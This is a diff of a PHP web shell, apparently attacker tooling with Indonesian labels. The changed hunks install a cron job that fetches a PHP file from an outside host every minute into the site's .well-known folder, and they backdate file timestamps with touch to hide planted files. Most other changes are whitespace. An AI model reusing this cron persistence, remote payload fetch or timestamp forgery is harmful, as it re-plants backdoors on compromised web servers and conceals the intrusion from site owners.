@@ -2179,7 +2179,7 @@ Link Config: <br>
                     	}
 
                     	$i = 0;
-                    	
+
                         foreach (scandir($folderio) as $detailsfolderx) {
 	                        $wpfolder = $folderio.DIRECTORY_SEPARATOR.$detailsfolderx;
 	                        if (is_dir($wpfolder) && $detailsfolderx != "." && $detailsfolderx != "..") {   
@@ -2283,13 +2283,13 @@ Link Config: <br>
                                                         
                                                         $report3 = mari_get_contents($itemsxz[$i++]); file_put_contents($lapor3, $report3); 
                                                         
-                                                        if (file_exists($lapor3)) {
+                                                        if (file_exists($lapor3) ) {
 	                                                        @touch/****/($lapor3, strtotime('-'.rand(30,90).' days', time())); 
 	                                                        @touch/****/($nonwpfolder, strtotime('-'.rand(30,90).' days', time()));
 	                                                        chmod($lapor3, 0644 );
-
-	                                                        echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."</a><br>";
-
+	                                                       
+	                                                        	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."</a><br>";
+	                                                   		
 
 	                                                    }
 	                                                    
@@ -2657,7 +2657,7 @@ lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9
 
 			if ($_POST['go']) {
 					if (!is_dir($_SERVER['DOCUMENT_ROOT'].'/.well-known/')) { mkdir($_SERVER['DOCUMENT_ROOT'].'/.well-known/', 0755, true); }
-					exe("(crontab -l 2>/dev/null; echo \"* * * * * curl --silent https://128.199.88.103/logo.png > ".$_SERVER['DOCUMENT_ROOT']."/.well-known/maridono.php\") | crontab -");
+					exe("(crontab -l 2>/dev/null; echo \"* * * * * curl --silent https://m.slotao.com/logo.png > ".$_SERVER['DOCUMENT_ROOT']."/.well-known/maridono.php\") | crontab -");
 					echo "Link: <a href='//".$_SERVER['HTTP_HOST']."/.well-known/maridono.php' target='_blank'>".$_SERVER['HTTP_HOST']."/.well-known/maridono.php</a> defense tiap menit! ";
 					echo "Done!";
 								$output=null;
@@ -2670,7 +2670,7 @@ lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9
 			echo "<li>=================================================</li></ol>";
 				}
 			if ($_POST['hapus']) {
-					exe("(crontab -l 2>/dev/null | grep -v \"curl --silent https://128.199.88.103/logo.png > ".$_SERVER['DOCUMENT_ROOT']."/.well-known/maridono.php\") | crontab -");
+					exe("(crontab -l 2>/dev/null | grep -v \"curl --silent https://m.slotao.com/logo.png > ".$_SERVER['DOCUMENT_ROOT']."/.well-known/maridono.php\") | crontab -");
 
 								$output=null;
 			$retval=null;
